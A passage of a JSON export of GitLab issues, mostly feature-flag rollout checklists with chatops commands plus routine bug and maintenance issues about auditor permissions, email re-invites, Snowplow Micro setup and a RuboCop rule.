to ensure GitLab customers are aware.\n- [ ] Notify `#support_gitlab-com` and your team channel ([more guidance when this is necessary in the dev docs](https://docs.gitlab.com/ee/development/feature_flags/controls.html#communicate-the-change)).\n\n### Global rollout on production\n\nFor visibility, all `/chatops` commands that target production should be executed in the `#production` slack channel and cross-posted (with the command results) to the responsible team's slack channel (`#g_TEAM_NAME`).\n\n- [ ] [Incrementally roll out](https://docs.gitlab.com/ee/development/feature_flags/controls.html#process) the feature.\n  - If the feature flag in code has [an actor](https://docs.gitlab.com/ee/development/feature_flags/#feature-actors), perform **actor-based** rollout.\n    - [ ] `/chatops run feature set \u003cfeature-flag-name\u003e \u003crollout-percentage\u003e --actors`\n  - If the feature flag in code does **NOT** have [an actor](https://docs.gitlab.com/ee/development/feature_flags/#feature-actors), perform time-based rollout (**random** rollout).\n    - [ ] `/chatops run feature set \u003cfeature-flag-name\u003e \u003crollout-percentage\u003e --random`\n  - Enable the feature globally on production environment.\n    - [x] `/chatops run feature set \u003cfeature-flag-name\u003e true`\n- [ ] Announce on [the feature issue](ISSUE LINK) that the feature has been globally enabled.\n- [x] Wait for [at least one day for the verification term](https://about.gitlab.com/handbook/product-development-flow/feature-flag-lifecycle/#including-a-feature-behind-feature-flag-in-the-final-release).\n\n### (Optional) Release the feature with the feature flag\n\nIf you're still unsure whether the feature is [deemed stable](https://about.gitlab.com/handbook/product-development-flow/feature-flag-lifecycle/#including-a-feature-behind-feature-flag-in-the-final-release)\nbut want to release it in the current milestone, you can change the default state of the feature flag to be enabled.\nTo do so, follow these steps:\n\n- [ ] Create a merge request with the following changes. Ask for review and merge it.\n    - [ ] Set the `default_enabled` attribute in [the feature flag definition](https://docs.gitlab.com/ee/development/feature_flags/#feature-flag-definition-and-validation) to `true`.\n    - [ ] Create [a changelog entry](https://docs.gitlab.com/ee/development/feature_flags/#changelog).\n- [ ] Ensure that the default-enabling MR has been deployed to both production and canary.\n      If the merge request was deployed before [the code cutoff](https://about.gitlab.com/handbook/engineering/releases/#self-managed-releases-1),\n      the feature can be officially announced in a release blog post.\n    - [ ] `/chatops run auto_deploy status \u003cmerge-commit-of-default-enabling-mr\u003e`\n- [ ] Close [the feature issue](ISSUE LINK) to indicate the feature will be released in the current milestone.\n- [ ] Set the next milestone to this rollout issue for scheduling [the flag removal](#release-the-feature).\n- [ ] (Optional) You can [create a separate issue](https://gitlab.com/gitlab-org/gitlab/-/issues/new?issuable_template=Feature%20Flag%20Cleanup) for scheduling the steps below to [Release the feature](#release-the-feature).\n    - [ ] Set the title to \"[Feature flag] Cleanup `\u003cfeature-flag-name\u003e`\".\n    - [ ] Execute the `/copy_metadata \u003cthis-rollout-issue-link\u003e` quick action to copy the labels from this rollout issue.\n    - [ ] Link this rollout issue as a related issue.\n    - [ ] Close this rollout issue.\n\n**WARNING:** This approach has the downside that it makes it difficult for us to\n[clean up](https://docs.gitlab.com/ee/development/feature_flags/controls.html#cleaning-up) the flag.\nFor example, on-premise users could disable the feature on their GitLab instance. But when you\nremove the flag at some point, they suddenly see the feature as enabled and they can't roll it back\nto the previous behavior. To avoid this potential breaking change, use this approach only for urgent\nmatters.\n\n### Release the feature\n\nAfter the feature has been [deemed stable](https://about.gitlab.com/handbook/product-development-flow/feature-flag-lifecycle/#including-a-feature-behind-feature-flag-in-the-final-release),\nthe [clean up](https://docs.gitlab.com/ee/development/feature_flags/controls.html#cleaning-up)\nshould be done as soon as possible to permanently enable the feature and reduce complexity in the\ncodebase.\n\nYou can either [create a follow-up issue for Feature Flag Cleanup](https://gitlab.com/gitlab-org/gitlab/-/issues/new?issuable_template=Feature%20Flag%20Cleanup) or use the checklist below in this same issue.\n\n\u003c!-- The checklist here is to help stakeholders keep track of the feature flag status --\u003e\n- [ ] Create a merge request to remove `\u003cfeature-flag-name\u003e` feature flag. Ask for review and merge it.\n    - [ ] Remove all references to the feature flag from the codebase.\n    - [ ] Remove the YAML definitions for the feature from the repository.\n    - [ ] Create [a changelog entry](https://docs.gitlab.com/ee/development/feature_flags/#changelog).\n- [ ] Ensure that the cleanup MR has been deployed to both production and canary.\n      If the merge request was deployed before [the code cutoff](https://about.gitlab.com/handbook/engineering/releases/#self-managed-releases-1),\n      the feature can be officially announced in a release blog post.\n    - [ ] `/chatops run auto_deploy status \u003cmerge-commit-of-cleanup-mr\u003e`\n- [ ] Close [the feature issue](ISSUE LINK) to indicate the feature will be released in the current milestone.\n- [ ] Clean up the feature flag from all environments by running these chatops command in `#production` channel:\n    - [ ] `/chatops run feature delete \u003cfeature-flag-name\u003e --dev`\n    - [ ] `/chatops run feature delete \u003cfeature-flag-name\u003e --staging`\n    - [ ] `/chatops run feature delete \u003cfeature-flag-name\u003e`\n- [ ] Close this rollout issue.\n\n## Rollback Steps\n\n- [ ] This feature can be disabled by running the following Chatops command:\n\n```\n/chatops run feature set \u003cfeature-flag-name\u003e false\n```","state":"closed","created_at":"2022-04-09T13:46:30.279Z","updated_at":"2022-07-05T06:59:22.771Z","closed_at":"2022-07-05T06:59:22.738Z","closed_by":{"id":4156052,"username":"ahegyi","name":"Adam Hegyi","state":"active","avatar_url":"https://secure.gravatar.com/avatar/ff7cdaff6b98fba9b977f1885578b8b3?s=80\u0026d=identicon","web_url":"https://gitlab.com/ahegyi"},"labels":["feature flag","feature::addition","type::feature","workflow::in review"],"milestone":{"id":2453024,"iid":74,"group_id":9970,"title":"15.2","description":"","state":"active","created_at":"2022-02-03T22:24:46.818Z","updated_at":"2022-02-03T22:26:32.010Z","due_date":"2022-07-17","start_date":"2022-06-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/74"},"assignees":[{"id":4156052,"username":"ahegyi","name":"Adam Hegyi","state":"active","avatar_url":"https://secure.gravatar.com/avatar/ff7cdaff6b98fba9b977f1885578b8b3?s=80\u0026d=identicon","web_url":"https://gitlab.com/ahegyi"}],"author":{"id":4156052,"username":"ahegyi","name":"Adam Hegyi","state":"active","avatar_url":"https://secure.gravatar.com/avatar/ff7cdaff6b98fba9b977f1885578b8b3?s=80\u0026d=identicon","web_url":"https://gitlab.com/ahegyi"},"type":"ISSUE","assignee":{"id":4156052,"username":"ahegyi","name":"Adam Hegyi","state":"active","avatar_url":"https://secure.gravatar.com/avatar/ff7cdaff6b98fba9b977f1885578b8b3?s=80\u0026d=identicon","web_url":"https://gitlab.com/ahegyi"},"user_notes_count":0,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/358649","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":50,"completed_count":6},"weight":1,"blocking_issues_count":0,"has_tasks":true,"task_status":"6 of 50 checklist items completed","_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/358649","notes":"https://gitlab.com/api/v4/projects/278964/issues/358649/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/358649/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#358649","relative":"#358649","full":"gitlab-org/gitlab#358649"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":null,"epic":null,"iteration":null,"health_status":null},{"id":106363066,"iid":358634,"project_id":278964,"title":"Auditor cannot see project Infrastructure menu item","description":"## Problem to solve\n\nAuditor cannot see Infrastructure in project left nav.\n\nPer [our docs](https://docs.gitlab.com/ee/administration/auditor_users.html#permissions-and-restrictions-of-an-auditor-user)\n\n\u003e Auditor users are able to have ... read-only access to all other resources, except the Admin Area [and Settings].\n\nSee \u00267469 for more details.\n\n## Expected behaviour\n\nAuditor has read-only access to project Infrastructure and all submenu items.","state":"closed","created_at":"2022-04-08T21:23:28.151Z","updated_at":"2022-04-25T21:34:08.356Z","closed_at":"2022-04-25T21:34:08.327Z","closed_by":{"id":9094263,"username":"anna_vovchenko","name":"Anna Vovchenko","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/9094263/avatar.png","web_url":"https://gitlab.com/anna_vovchenko"},"labels":["Stretch","candidate::15.0","devops::configure","group::configure","internal customer","reproduced on GitLab.com","section::ops","severity::3","type::bug","workflow::production"],"milestone":{"id":2095271,"iid":65,"group_id":9970,"title":"15.0","description":"","state":"active","created_at":"2021-06-08T15:35:34.814Z","updated_at":"2021-11-02T18:23:35.115Z","due_date":"2022-05-17","start_date":"2022-04-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/65"},"assignees":[{"id":9094263,"username":"anna_vovchenko","name":"Anna Vovchenko","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/9094263/avatar.png","web_url":"https://gitlab.com/anna_vovchenko"}],"author":{"id":2454149,"username":"cynthia","name":"Cynthia \"Arty\" Ng","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/2454149/avatar.png","web_url":"https://gitlab.com/cynthia"},"type":"ISSUE","assignee":{"id":9094263,"username":"anna_vovchenko","name":"Anna Vovchenko","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/9094263/avatar.png","web_url":"https://gitlab.com/anna_vovchenko"},"user_notes_count":7,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/358634","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":1,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/358634","notes":"https://gitlab.com/api/v4/projects/278964/issues/358634/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/358634/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#358634","relative":"#358634","full":"gitlab-org/gitlab#358634"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":7469,"epic":{"id":432129,"iid":7469,"title":"Ensure Auditor permissions in UI follow docs","url":"/groups/gitlab-org/-/epics/7469","group_id":9970},"iteration":null,"health_status":null},{"id":106361886,"iid":358626,"project_id":278964,"title":"Allow invites by emails to be re-invited","description":"## Problem\n\nCurrently we do not allow invites by email from the invite modal for emails to be re-invited.\n\nHowever, we do allow users by username to be re-invited without error.\n\n## Solution\n\nAllow invites by email to be re-invited.  This could be as simple as modifying [this line](http://gitlab.com/gitlab-org/gitlab/blob/e4e407926d96db6dee400fee39f309edf46e0fed/app/services/members/creator_service.rb#L102-102) to be a `find_or_initialize_by` instead of a `build` which currently attempts to create a new record.\n\n## Why do it this way\n\n- in https://gitlab.com/gitlab-org/gitlab/-/issues/360011 we are attempting to handle `partial failures` gracefully and allow re-submission of the form when those issues are resolved.  By default they will resubmit the successful invites as well in the form as well.  This will allow those resubmissions to be ok as well on emails.\n- syncs to how the username re-invite works\n- allows easier handling of error situations and closes https://gitlab.com/gitlab-org/gitlab/-/issues/334280#note_910453972","state":"closed","created_at":"2022-04-08T20:40:31.119Z","updated_at":"2022-07-07T12:50:09.365Z","closed_at":"2022-07-07T11:57:03.871Z","closed_by":{"id":3841241,"username":"dstull","name":"Doug Stull","state":"active","avatar_url":"https://secure.gravatar.com/avatar/c2d7b8532bca28f593b193b012841a40?s=80\u0026d=identicon","web_url":"https://gitlab.com/dstull"},"labels":["devops::growth","feature::enhancement","group::acquisition","section::growth","type::feature","workflow::in review"],"milestone":{"id":2453024,"iid":74,"group_id":9970,"title":"15.2","description":"","state":"active","created_at":"2022-02-03T22:24:46.818Z","updated_at":"2022-02-03T22:26:32.010Z","due_date":"2022-07-17","start_date":"2022-06-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/74"},"assignees":[{"id":3841241,"username":"dstull","name":"Doug Stull","state":"active","avatar_url":"https://secure.gravatar.com/avatar/c2d7b8532bca28f593b193b012841a40?s=80\u0026d=identicon","web_url":"https://gitlab.com/dstull"}],"author":{"id":3841241,"username":"dstull","name":"Doug Stull","state":"active","avatar_url":"https://secure.gravatar.com/avatar/c2d7b8532bca28f593b193b012841a40?s=80\u0026d=identicon","web_url":"https://gitlab.com/dstull"},"type":"ISSUE","assignee":{"id":3841241,"username":"dstull","name":"Doug Stull","state":"active","avatar_url":"https://secure.gravatar.com/avatar/c2d7b8532bca28f593b193b012841a40?s=80\u0026d=identicon","web_url":"https://gitlab.com/dstull"},"user_notes_count":2,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/358626","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":2,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/358626","notes":"https://gitlab.com/api/v4/projects/278964/issues/358626/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/358626/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#358626","relative":"#358626","full":"gitlab-org/gitlab#358626"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":3502,"epic":{"id":62876,"iid":3502,"title":"Move the \"invite members\" form into a modal","url":"/groups/gitlab-org/-/epics/3502","group_id":9970,"human_readable_end_date":"Jan 17, 2023","human_readable_timestamp":"\u003cstrong\u003e2\u003c/strong\u003e days remaining"},"iteration":null,"health_status":null},{"id":106361588,"iid":358623,"project_id":278964,"title":"Improve handling backend Snowplow events by GDK Snowplow Micro setup","description":"### Problem\n\nCurrently, it's not clear that the [GDK Snowplow Micro setup](https://gitlab.com/gitlab-org/gitlab-development-kit/-/blob/main/doc/howto/snowplow_micro.md) sets up the collector only for front-end events in the GDK-managed Rails server, and not for Rails console.\n\nBeing able to properly send backend events from the console requires passing Snowplow env variables:\n\n```shell\nSNOWPLOW_MICRO_ENABLE=1 SNOWPLOW_MICRO_URI=http://localhost:9091 bundle exec rails c\n```\n\n### Proposal\n\nEither:\n1. Update [Snowplow Micro docs](https://docs.gitlab.com/ee/development/snowplow/implementation.html#snowplow-micro) to point out that extra setup is needed to properly send backend Snowplow events in Rails console.\n2. Make Rails console work out-of-the-box with the GDK setup when it's enabled.","state":"closed","created_at":"2022-04-08T20:27:59.123Z","updated_at":"2022-10-04T08:58:27.444Z","closed_at":"2022-07-07T08:50:02.255Z","closed_by":{"id":1863977,"username":"michold","name":"MichaÅ‚ Wielich","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/1863977/avatar.png","web_url":"https://gitlab.com/michold"},"labels":["backend","devops::analytics","group::product intelligence","missed:15.1","quad-planning::complete-no-action","section::analytics","snowplow tracking events","tooling","type::feature","workflow::in review"],"milestone":{"id":2453024,"iid":74,"group_id":9970,"title":"15.2","description":"","state":"active","created_at":"2022-02-03T22:24:46.818Z","updated_at":"2022-02-03T22:26:32.010Z","due_date":"2022-07-17","start_date":"2022-06-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/74"},"assignees":[{"id":1863977,"username":"michold","name":"MichaÅ‚ Wielich","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/1863977/avatar.png","web_url":"https://gitlab.com/michold"}],"author":{"id":8013274,"username":"pskorupa","name":"Piotr Skorupa","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/8013274/avatar.png","web_url":"https://gitlab.com/pskorupa"},"type":"ISSUE","assignee":{"id":1863977,"username":"michold","name":"MichaÅ‚ Wielich","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/1863977/avatar.png","web_url":"https://gitlab.com/michold"},"user_notes_count":8,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/358623","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":2,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/358623","notes":"https://gitlab.com/api/v4/projects/278964/issues/358623/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/358623/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#358623","relative":"#358623","full":"gitlab-org/gitlab#358623"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":null,"epic":null,"iteration":null,"health_status":null},{"id":106354432,"iid":358608,"project_id":278964,"title":"Add a cop to prevent use of `disable_referential_integrity`","description":"## :boom: Problem\n\n`disable_referential_integrity` allows a developer to [disable all triggers on all tables](https://github.com/rails/rails/blob/831031a8cec5bfe59ef653ae2857d4fe64c5698d/activerecord/lib/active_record/connection_adapters/postgresql/referential_integrity.rb#L12) in the database. This can lead to data consistency problems as described in [this PostgreSQL thread](https://www.postgresql.org/message-id/flat/0e4ea8e7-bfe2-b3ce-1edb-baa247bac0ca%40wi3ck.info#c1faa61f9e8fa285332427a3e1a6c9f3).\n\nThere are two problems with this method:\n\n* Triggers are disabled for all tables even though we may only need to disable them for one table\n* The disabling of triggers occurs in a separate database transaction from the query, which presents an opportunity for rollback problem.\n\n## :bulb: Solution\n\nIf triggers need to be disabled, we should do so on the specific table, or optimally on the specific constraint needed.\n\nWe should add a rubocop rule to prevent use of `disable_referential_integrity`.\n\nIt is generally used as:\n\n```ruby\nActiveRecord::Base.connection.disable_referential_integrity do\n  # query\nend\n```\n\n#### Related\n\nhttps://gitlab.com/gitlab-org/gitlab/-/issues/358606 removes existing usage of this method.","state":"closed","created_at":"2022-04-08T17:12:04.122Z","updated_at":"2022-04-19T13:17:11.357Z","closed_at":"2022-04-19T13:17:05.136Z","closed_by":{"id":4059254,"username":"sabrams","name":"Steve Abrams","state":"active","avatar_url":"https://secure.gravatar.com/avatar/cac831f7b515c191dfba32c54f01c375?s=80\u0026d=identicon","web_url":"https://gitlab.com/sabrams"},"labels":["Category:Container Registry","Category:Package Registry","backend","devops::package","group::package registry","maintenance::workflow","ruby","section::ops","type::maintenance","workflow::production"],"milestone":{"id":2095271,"iid":65,"group_id":9970,"title":"15.0","description":"","state":"active","created_at":"2021-06-08T15:35:34.814Z","updated_at":"2021-11-02T18:23:35.115Z","due_date":"2022-05-17","start_date":"2022-04-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/65"},"assignees":[{"id":4059254,"username":"sabrams","name":"Steve Abrams","state":"active","avatar_url":"https://secure.gravatar.com/avatar/cac831f7b515c191dfba32c54f01c375?s=80\u0026d=identicon","web_url":"https://gitlab.com/sabrams"}],"author":{"id":4059254,"username":"sabrams","name":"Steve Abrams","state":"active","avatar_url":"https://secure.gravatar.com/avatar/cac831f7b515c191dfba32c54f01c375?s=80\u0026d=identicon","web_url":"https://gitlab.com/sabrams"},"type":"ISSUE","assignee":{"id":4059254,"username":"sabrams","name":"Steve Abrams","state":"active","avatar_url":"https://secure.gravatar.com/avatar/cac831f7b515c191dfba32c54f01c375?s=80\u0026d=identicon","web_url":"https://gitlab.com/sabrams"},"user_notes_count":6,"merge_requests_count":0,"upvotes":2,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/358608","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":1,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/358608","notes":"https://gitlab.com/api/v4/projects/278964/issues/358608/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/358608/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#358608","relative":"#358608","full":"gitlab-org/gitlab#358608"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":null,"epic":null,"iteration":null,"health_status":null},{"id":106339230,"iid":358425,"project_id":278964,"title":"[Feature flag] Rollout of `ci_log_downstream_pipeline_creation`","description":"\u003c!-- Title suggestion: [Feature flag] Enable description of feature --\u003e\n\n## Summary\n\nThis issue is to rollout [the logging of downstream pipeline creation](https://gitlab.com/gitlab-org/gitlab/-/issues/285090) on production,\nthat is currently behind the `ci_log_downstream_pipeline_creation` feature flag.\n\n\u003c!-- Short description of what the feature is about and link to relevant other issues. --\u003e\n\n## Owners\n\n- Team: ~\"group::pipeline execution\" \n- Most appropriate slack channel to reach out to: `#g_pipeline-execution`\n- Best individual to reach out to: @fabiopitino \n- PM: @jheimbuck_gl \n\n## Stakeholders\n\n\u003c!--\nAre there any other stages or teams involved that need to be kept in the loop?\n\n- Name of a PM\n- The Support Team\n- The Delivery Team\n--\u003e\n\n## Expectations\n\n### What are we expecting to happen?\n\nNew log lines showing up in Kibana for any new downstream pipeline being persisted, either multi-project or parent-child pipelines.\n\n### When is the feature viable?\n\nAs soon as https://gitlab.com/gitlab-org/gitlab/-/merge_requests/84760 is deployed to the relative environment where we are trying to enable the feature flag.\n\n\u003c!-- \nExample below:\n \n1. Enable service ping collection\n   `ApplicationSetting.first.update(usage_ping_enabled: true)`\n--\u003e\n\n### What might happen if this goes wrong?\n\n- No logs appear in Kibana.\n- Errors in Sentry for `Ci::CreateDownstreamPipelineWorker` if downstream pipeline fails because on the code added.\n\n### What can we monitor to detect problems with this?\n\n\u003c!-- Which dashboards from https://dashboards.gitlab.net are most relevant? --\u003e\n_Consider mentioning checks for 5xx errors or other anomalies like an increase in redirects \n(302 HTTP response status)_\n\n- Sentry errors from `Ci::CreateDownstreamPipelineWorker`.\n- `Ci::CreateDownstreamPipelineWorker` Sidekiq logs in Kibana for any errors.\n\n### What can we check for monitoring production after rollouts?\n\n- Monitor sidekiq logs for `json.message: \"downstream pipeline created\"` https://log.gprd.gitlab.net/goto/8956b0c0-ba51-11ec-afaf-2bca15dfbf33\n\n## Rollout Steps\n\n### Rollout on non-production environments\n\n- Ensure that the feature MRs have been deployed to non-production environments.\n    - [x] `/chatops run auto_deploy status \u003cmerge-commit-of-your-feature\u003e`\n- [x] Enable the feature globally on non-production environments.\n    - [x] `/chatops run feature set \u003cfeature-flag-name\u003e true --dev`\n    - [x] `/chatops run feature set \u003cfeature-flag-name\u003e true --staging`\n- [x] Verify that the feature works as expected. Posting the QA result in this issue is preferable.\n\n### Specific rollout on production\n\n- Ensure that the feature MRs have been deployed to both production and canary.\n    - [x] `/chatops run auto_deploy status \u003cmerge-commit-of-your-feature\u003e`\n- If you're using [project-actor](https://docs.gitlab.com/ee/development/feature_flags/#feature-actors), you must enable the feature on these entries:\n    - [x] `/chatops run feature set --project=gitlab-org/gitlab \u003cfeature-flag-name\u003e true`\n    - [x] `/chatops run feature set --project=gitlab-org/gitlab-foss \u003cfeature-flag-name\u003e true`\n    - [x] `/chatops run feature set --project=gitlab-com/www-gitlab-com \u003cfeature-flag-name\u003e true`\n- If you're using [group-actor](https://docs.gitlab.com/ee/development/feature_flags/#feature-actors), you must enable the feature on these entries:\n    - [ ] `/chatops run feature set --group=gitlab-org \u003cfeature-flag-name\u003e true`\n    - [ ] `/chatops run feature set --group=gitlab-com \u003cfeature-flag-name\u003e true`\n- If you're using [user-actor](https://docs.gitlab.com/ee/development/feature_flags/#feature-actors), you must enable the feature on these entries:\n    - [ ] `/chatops run feature set --user=\u003cyour-username\u003e \u003cfeature-flag-name\u003e true`\n- [ ] Verify that the feature works on the specific entries. Posting the QA result in this issue is preferable.\n\n### Preparation before global rollout\n\n- [x] Check if the feature flag change needs to be accompanied with a\n  [change management issue](https://about.gitlab.com/handbook/engineering/infrastructure/change-management/#feature-flags-and-the-change-management-process).\n  Cross link the issue here if it does.\n- [x] Ensure that you or a representative in development can be available for at least 2 hours after feature flag updates in production.\n  If a different developer will be covering, or an exception is needed, please inform the oncall SRE by using the `@sre-oncall` Slack alias.\n- [x] Ensure that documentation has been updated ([More info](https://docs.gitlab.com/ee/development/documentation/feature_flags.html#features-that-became-enabled-by-default)).\n- [x] Announce on [the feature issue](ISSUE LINK) an estimated time this will be enabled on GitLab.com. \n- [ ] Ensure that any breaking changes have been announced following the [release post process](https://about.gitlab.com/handbook/marketing/blog/release-posts/#deprecations-removals-and-breaking-changes) to ensure GitLab customers are aware.\n- [ ] Notify `#support_gitlab-com` and your team channel ([more guidance when this is necessary in the dev docs](https://docs.gitlab.com/ee/development/feature_flags/controls.html#communicate-the-change)).\n\n### Global rollout on production\n\nFor visibility, all `/chatops` commands that target production should be executed in the `#production` slack channel and cross-posted (with the command results) to the responsible team's slack channel (`#g_TEAM_NAME`).\n\n- [x] [Incrementally roll out](https://docs.gitlab.com/ee/development/feature_flags/controls.html#process) the feature.\n  - If the feature flag in code has [an actor](https://docs.gitlab.com/ee/development/feature_flags/#feature-actors), perform **actor-based** rollout.\n    - [x] `/chatops run feature set \u003cfeature-flag-name\u003e \u003crollout-percentage\u003e --actors`\n  - If the feature flag in code does **NOT** have [an actor](https://docs.gitlab.com/ee/development/feature_flags/#feature-actors), perform time-based rollout (**random** rollout).\n    - [ ] `/chatops run feature set \u003cfeature-flag-name\u003e \u003crollout-percentage\u003e --random`\n  - Enable the feature globally on production environment.\n    - [ ] `/chatops run feature set \u003cfeature-flag-name\u003e true`\n- [x] Announce on [the feature issue](ISSUE LINK) that the feature has been globally enabled.\n- [x] Wait for [at least one day for the verification term](https://about.gitlab.com/handbook/product-development-flow/feature-flag-lifecycle/#including-a-feature-behind-feature-flag-in-the-final-release).\n\n### (Optional) Release the feature with the feature flag\n\nIf you're still unsure whether the feature is [deemed stable](https://about.gitlab.com/handbook/product-development-flow/feature-flag-lifecycle/#including-a-feature-behind-feature-flag-in-the-final-release)\nbut want to release it in the current milestone, you can change the default state of the feature flag to be enabled.\nTo do so, follow these steps:\n\n- [ ] Create a merge request with the following changes. Ask for review and merge it.\n    - [ ] Set the `default_enabled` attribute in [the feature flag definition](https://docs.gitlab.com/ee/development/feature_flags/#feature-flag-definition-and-validation) to `true`.\n    - [ ] Create [a changelog entry](https://docs.gitlab.com/ee/development/feature_flags/#changelog).\n- [ ] Ensure that the default-enabling MR has been deployed to both production and canary.\n      If the merge request was deployed before [the code cutoff](https://about.gitlab.com/handbook/engineering/releases/#self-managed-releases-1),\n      the feature can be officially announced in a release blog post.\n    - [ ] `/chatops run auto_deploy status \u003cmerge-commit-of-default-enabling-mr\u003e`\n- [ ] Close [the feature issue](ISSUE LINK) to indicate the feature will be released in the current milestone.\n- [ ] Set the next milestone to this rollout issue for scheduling [the flag removal](#release-the-feature).\n- [ ] (Optional) You can [create a separate issue](https://gitlab.com/gitlab-org/gitlab/-/issues/new?issuable_template=Feature%20Flag%20Cleanup) for scheduling the steps below to [Release the feature](#release-the-feature).\n    - [ ] Set the title to \"[Feature flag] Cleanup `\u003cfeature-flag-name\u003e`\".\n    - [ ] Execute the `/copy_metadata \u003cthis-rollout-issue-link\u003e` quick action to copy the labels from this rollout issue.\n    - [ ] Link this rollout issue as a related issue.\n    - [ ] Close this rollout issue.\n\n**WARNING:** This approach has the downside that it makes it difficult for us to\n[clean up](https://docs.gitlab.com/ee/development/feature_flags/controls.html#cleaning-up) the flag.\nFor example, on-premise users could disable the feature on their GitLab instance. But when you\nremove the flag at some point, they suddenly see the feature as enabled and they can't roll it back\nto the previous behavior. To avoid this potential breaking change, use this approach only for urgent\nmatters.\n\n### Release the feature\n\nAfter the feature has been [deemed stable](https://about.gitlab.com/handbook/product-development-flow/feature-flag-lifecycle/#including-a-feature-behind-feature-flag-in-the-final-release),\nthe [clean up](https://docs.gitlab.com/ee/development/feature_flags/controls.html#cleaning-up)\nshould be done as soon as possible to permanently enable the feature and reduce complexity in the\ncodebase.\n\nYou can either [create a follow-up issue for Feature Flag Cleanup](https://gitlab.com/gitlab-org/gitlab/-/issues/new?issuable_template=Feature%20Flag%20Cleanup) or use the checklist below in this same issue.\n\n\u003c!-- The checklist here is to help stakeholders keep track of the feature flag status --\u003e\n- [x] Create a merge request to remove `\u003cfeature-flag-name\u003e` feature flag. Ask for review and merge it.\n    - [x] Remove all references to the feature flag from the codebase.\n    - [x] Remove the YAML definitions for the feature from the repository.\n    - [x] Create [a changelog entry](https://docs.gitlab.com/ee/development/feature_flags/#changelog).\n- [x] Ensure that the cleanup MR has been deployed to both production and canary.\n      If the merge request was deployed before [the code cutoff](https://about.gitlab.com/handbook/engineering/releases/#self-managed-releases-1),\n      the feature can be officially announced in a release blog post.\n    - [x] `/chatops run auto_deploy status \u003cmerge-commit-of-cleanup-mr\u003e`\n- [x] Close [the feature issue](ISSUE LINK) to indicate the feature will be released in the current milestone.\n- [x] Clean up the feature flag from all environments by running these chatops command in `#production` channel:\n    - [ ] `/chatops run feature delete \u003cfeature-flag-name\u003e --dev`\n    - [ ] `/chatops run feature delete \u003cfeature-flag-name\u003e --staging`\n    - [ ] `/chatops run feature delete \u003cfeature-flag-name\u003e`\n- [x] Close this rollout issue.\n\n## Rollback Steps\n\n- [ ] This feature can be disabled by running the following Chatops command:\n\n```\n/chatops run feature set \u003cfeature-flag-name\u003e false\n```","state":"closed","created_at":"2022-04-08T15:21:49.870Z","updated_at":"2022-05-24T15:48:56.286Z","closed_at":"2022-05-05T09:50:47.438Z","closed_by":{"id":695467,"username":"fabiopitino","name":"Fabio 